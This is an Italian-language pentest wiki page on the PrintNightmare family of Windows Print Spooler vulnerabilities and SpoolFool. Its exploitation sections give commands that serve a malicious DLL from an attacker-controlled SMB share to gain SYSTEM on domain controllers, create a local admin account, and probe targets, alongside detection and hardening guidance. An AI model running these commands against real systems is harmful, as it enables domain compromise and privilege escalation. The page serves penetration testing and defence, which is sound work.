# PrintNightmare (RCE/LPE di Windows Print Spooler)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare è il nome collettivo dato a una famiglia di vulnerabilità nel servizio **Print Spooler** di Windows che consentono **l'esecuzione di codice arbitrario come SYSTEM** e, quando lo spooler è raggiungibile tramite RPC, **l'esecuzione di codice remoto (RCE) sui controller di dominio e sui file server**. Le CVE più sfruttate sono **CVE-2021-1675** (inizialmente classificata come LPE) e **CVE-2021-34527** (RCE completa). Problemi successivi, come **CVE-2021-34481 (“Point & Print”)** e **CVE-2022-21999 (“SpoolFool”)**, dimostrano che la superficie di attacco è ancora tutt'altro che chiusa.

Se cerchi **l'abuso dello spooler per forzare l'autenticazione / eseguire relay**, anziché **RCE/LPE basate sui driver**, consulta [questa altra pagina sull'abuso della coercizione tramite stampanti](printers-spooler-service-abuse.md). Questa pagina è incentrata sul **caricamento di driver / DLL come SYSTEM**.

---

## 1. Componenti vulnerabili e CVE

| Anno | CVE | Nome breve | Primitiva | Note |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Corretta nel CU di giugno 2021, ma aggirata da CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` consente agli utenti autenticati di caricare una DLL di driver da una condivisione remota; dopo agosto 2021, di solito richiede criteri Point & Print indeboliti|
|2021|CVE-2021-34481|“Point & Print”|LPE|Installazione di driver non firmati da parte di utenti non amministratori|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Creazione di directory arbitrarie → DLL planting – funziona anche dopo le patch del 2021|

Tutte sfruttano uno dei **metodi RPC MS-RPRN / MS-PAR** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) o le relazioni di fiducia interne a **Point & Print**.

## 2. Tecniche di exploit

### 2.1 Compromissione remota del controller di dominio (CVE-2021-34527)

Un utente di dominio autenticato ma **non privilegiato** può eseguire DLL arbitrarie come **NT AUTHORITY\SYSTEM** su uno spooler remoto (spesso il DC) tramite:

```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
       -f \
       '\\attacker_IP\share\evil.dll'
```

I PoC più diffusi includono **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) e i moduli `misc::printnightmare / lsa::addsid` di Benjamin Delpy in **mimikatz**.

### 2.2 Escalation dei privilegi locale (qualsiasi versione di Windows supportata, 2021-2024)

La stessa API può essere chiamata **localmente** per caricare un driver da `C:\Windows\System32\spool\drivers\x64\3\` e ottenere privilegi SYSTEM:

```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```

### 2.3 Triage moderna sugli host aggiornati

Su un host completamente aggiornato, i PoC pubblici di PrintNightmare spesso non funzionano perché Windows ora consente per impostazione predefinita l'installazione dei driver di stampa **solo agli amministratori** (`RestrictDriverInstallationToAdministrators=1` dal 10 agosto 2021). Prima di lanciare un exploit contro un target, verifica innanzitutto se nell'ambiente è stata annullata questa misura di sicurezza per le distribuzioni legacy delle stampanti:<sup>[[3]](#references)</sup>

```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```

I due valori deboli più interessanti sono di solito:<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Da Linux, verifica rapidamente che il target esponga le interfacce RPC di stampa pertinenti prima di eseguire un PoC:

```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```

Alcuni strumenti pubblici più recenti offrono anche un flusso di lavoro più sicuro di **verifica/elenco** prima di inviare una DLL:

```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```

> Se un utente con privilegi limitati riceve `RPC_E_ACCESS_DENIED` (`0x8001011b`), di solito sta osservando il comportamento predefinito introdotto dopo il 2021, non un errore di trasporto.

> Su Windows 11 22H2+ e build client più recenti, la stampa remota usa per impostazione predefinita **RPC over TCP** e **RPC over named pipes** (`\PIPE\spoolss`) è disabilitato, a meno che non venga riabilitato esplicitamente. Alcuni PoC meno recenti e appunti di laboratorio danno ancora per scontato che la named pipe sia raggiungibile.<sup>[[4]](#references)</sup>

### 2.4 Abuso di Package Point & Print nelle reti “patched”

Molti ambienti aziendali sono rimasti **vulnerabili per via delle policy** anche dopo le patch originali del 2021, perché i flussi di lavoro dell'helpdesk o dei print server richiedevano ancora agli utenti non amministratori di installare/aggiornare i driver. In pratica, il playbook offensivo diventa:

- Se le richieste di sicurezza sono completamente disabilitate, **il classico PrintNightmare con DLL arbitraria** resta la strada più breve.
- Se `Only use Package Point and Print` è abilitato, di solito è necessario passare a un percorso basato su un **driver firmato compatibile con i package**, anziché caricare una DLL grezza.<sup>[[3]](#references)</sup>
- Una ricerca del 2024 ha mostrato che **`Package Point and Print - Approved servers` non costituisce di per sé un confine di fiducia rigido**: se un attacker riesce a falsificare o dirottare la risoluzione dei nomi di un print server approvato, le vittime possono comunque essere reindirizzate a un server malevolo che soddisfa i controlli delle policy.<sup>[[4]](#references)</sup>
- Anche combinare l'hardening UNC con l'uso forzato di RPC-over-SMB può essere instabile, perché i client moderni possono **passare a RPC over TCP**.<sup>[[4]](#references)</sup>

Per questo motivo, lo sfruttamento moderno in stile PrintNightmare riguarda spesso più **l'abuso delle policy aziendali di distribuzione delle stampanti** che la ripetizione invariata del PoC originale del 2021.

### 2.5 SpoolFool (CVE-2022-21999) – aggirare le correzioni del 2021

Le patch Microsoft del 2021 hanno bloccato il caricamento remoto dei driver, ma **non hanno rafforzato le autorizzazioni delle directory**. SpoolFool sfrutta il parametro `SpoolDirectory` per creare una directory arbitraria sotto `C:\Windows\System32\spool\drivers\`, vi deposita una DLL payload e forza lo spooler a caricarla:<sup>[[2]](#references)</sup>

```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```

> L’exploit funziona su Windows 7 → Windows 11 e Server 2012R2 → 2022 completamente aggiornati, prima degli update di febbraio 2022<sup>[[2]](#references)</sup>

---

## 3. Rilevamento e hunting

* **Log PrintService** – abilita il canale *Microsoft-Windows-PrintService/Operational* e monitora **Event ID 316** (driver aggiunto/aggiornato, di solito include i nomi delle DLL) sia per i tentativi riusciti che per quelli falliti. Associalo a **Event ID 808/811** per rilevare errori sospetti di caricamento di moduli/driver dello spooler.
* **Sysmon** – `Event ID 7` (Image loaded) o `11/23` (scrittura/eliminazione di file) all’interno di `C:\Windows\System32\spool\drivers\*` quando il processo padre è **spoolsv.exe**.
* **Process lineage** – genera un alert ogni volta che **spoolsv.exe** avvia `cmd.exe`, `rundll32.exe`, PowerShell o qualsiasi processo figlio non firmato e imprevisto.
* **Telemetria di rete** – trasferimenti SMB imprevisti da **spoolsv.exe** verso share controllate dall’attaccante o traffico RPC della stampante insolito proveniente da server che non dovrebbero comportarsi come print server sono entrambi indicatori di grande rilevanza.

## 4. Mitigazione e hardening

1. **Applica le patch!** – Installa l’ultimo aggiornamento cumulativo su ogni host Windows con il servizio Print Spooler installato.
2. **Disabilita lo spooler dove non è necessario**, in particolare sui Domain Controller:
   ```powershell
   Stop-Service Spooler -Force
   Set-Service Spooler -StartupType Disabled
   ```
3. **Blocca le connessioni remote** consentendo comunque la stampa locale – Criteri di gruppo: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Mantieni Point & Print riservato agli amministratori** impostando:
   ```cmd
   reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
           /v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
   ```
   Indicazioni dettagliate nella KB5005652 di Microsoft<sup>[[1]](#references)</sup>
5. Se i requisiti aziendali impongono `RestrictDriverInstallationToAdministrators=0`, considera ogni altra policy relativa alle stampanti **solo una mitigazione parziale**. Come minimo, preferisci **package-aware drivers**, abilita **Only use Package Point and Print** e limita **Package Point and Print - Approved servers** ai server di stampa esplicitamente autorizzati all'interno della foresta.<sup>[[3]](#references)</sup>
6. **Non ripristinare la privacy RPC delle stampanti** solo per correggere le mappature delle stampanti non funzionanti. Gli ambienti che impostano `RpcAuthnLevelPrivacyEnabled=0` annullano le misure di hardening introdotte per **CVE-2021-1678** e in genere meritano un'attenzione aggiuntiva durante un engagement.<sup>[[4]](#references)</sup>

---

## 5. Ricerche / strumenti correlati

* Moduli `printnightmare` di [mimikatz](https://github.com/gentilkiwi/mimikatz/tree/master/modules)
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – implementazione standard di Impacket con modalità `-check`, `-list` e `-delete`
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – wrapper con distribuzione SMB integrata, supporto multi-target e modalità `MS-RPRN` / `MS-PAR`
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – abuso di un driver di stampa vulnerabile fornito dall'attaccante tramite package Point & Print
* Exploit e write-up di SpoolFool
* Micropatch di 0patch per SpoolFool e altri bug dello spooler

Se vuoi **forzare l'autenticazione** tramite lo spooler invece di caricare un driver, consulta [l'abuso del servizio spooler delle stampanti](printers-spooler-service-abuse.md).

---

## References

- [1] [Microsoft – KB5005652: Gestire il nuovo comportamento predefinito di installazione dei driver di Point & Print](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool: CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – Guida pratica a PrintNightmare nel 2024](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – PrintNightmare non è ancora finito](https://itm4n.github.io/printnightmare-not-over/)
{{#include ../../banners/hacktricks-training.md}}
